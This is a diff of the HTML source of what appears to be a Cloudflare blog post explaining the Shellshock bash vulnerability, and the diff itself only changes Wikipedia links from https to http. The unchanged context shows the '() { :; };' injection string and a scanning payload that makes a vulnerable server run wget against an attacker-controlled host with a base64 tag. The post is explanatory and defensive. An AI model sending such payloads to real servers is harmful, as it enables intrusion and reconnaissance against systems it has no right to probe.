@@ -1,6 +1,6 @@
 <div class="mb2 gray5">8 min read</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4KJYmql9e9J7bf7tHMJRh5/e6ff7458580659fd36447e6a356cf057/inside-shellshock.png" alt="">
 <div class="post-content post-body-content lh-copy gray1">
-	<p>On Wednesday of last week, details of the <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="noopener noreferrer">Shellshock</a> bash bug emerged. This bug started a scramble to patch computers, servers, routers, firewalls, and other computing appliances using vulnerable versions of bash.</p>
+	<p>On Wednesday of last week, details of the <a href="http://en.wikipedia.org/wiki/Shellshock_(software_bug)" target="_blank" rel="noopener noreferrer">Shellshock</a> bash bug emerged. This bug started a scramble to patch computers, servers, routers, firewalls, and other computing appliances using vulnerable versions of bash.</p>
 	<figure class="kg-card kg-image-card ">
 
 		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6L3sgALNPL4lzR339hqcdb/568d1050760c355a07b8bee8ed491c4f/illustration-bash-blog-1.png" alt="" class="kg-image" width="1900" height="640" loading="lazy">
@@ -22,7 +22,7 @@
 			</svg>
 		</a>
 	</div>
-	<p>The Shellshock problem is an example of an <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution" target="_blank" rel="noopener noreferrer">arbitrary code execution (ACE)</a> vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</p>
+	<p>The Shellshock problem is an example of an <a href="http://en.wikipedia.org/wiki/Arbitrary_code_execution" target="_blank" rel="noopener noreferrer">arbitrary code execution (ACE)</a> vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</p>
 	<p>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a "shell". A shell is a command-line where commands can be entered and executed.</p>
 	<p>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</p>
 	<p>Suppose for a moment that you wanted to attack a web server and make its CD or DVD drive slide open. There's actually a command on Linux that will do that: <code>/bin/eject</code>. If a web server is vulnerable to Shellshock you could attack it by adding the magic string <code>() { :; };</code> to <code>/bin/eject</code> and then sending that string to the target computer over HTTP. Normally, the <code>User-Agent</code> string would identify the type of browser you are using, but, in in the case of the Shellshock vulnerability, it can be set to say anything.</p>
@@ -127,7 +127,7 @@ HTTP_HOST=cloudflare.com</code></pre>
 	<p>Another technique being used to identify vulnerable servers is to make the web server download a web page from an attacker-controlled machine. The attacker can then look in their web server logs to find out which machine was vulnerable. This attack works by sending a Shellshock string like:</p>
 	<pre class="language-bash"><code class="language-bash">() {:;}; /usr/bin/wget http://attacker-controlled.com/ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA== &gt;&gt; /dev/null</code></pre>
 	<p>The attacker looks in the web server log of attacker-controlled.com for entries. The page downloaded is set up by the attacker to be reveal the name of the site being attacked. The <code>ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA==</code> is actually a code indicating that the attacked site was example.com.</p>
-	<p><code>ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA==</code> is actually a <a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreferrer">base64</a> encoded string. When it is decoded it reads:</p>
+	<p><code>ZXhhbXBsZS5jb21TaGVsbFNob2NrU2FsdA==</code> is actually a <a href="http://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreferrer">base64</a> encoded string. When it is decoded it reads:</p>
 	<pre class="language-bash"><code class="language-bash">example.comShellShockSalt</code></pre>
 	<p>From this string the attacker can find out if their attack on example.com was successful, and, if so, they can then go back later to further exploit that site. While I've substituted out the domain that was the target, we are seeing real examples in the wild actually using <code>ShellShockSalt</code> as the salt in the hash.</p>
 	<div class="flex anchor relative">
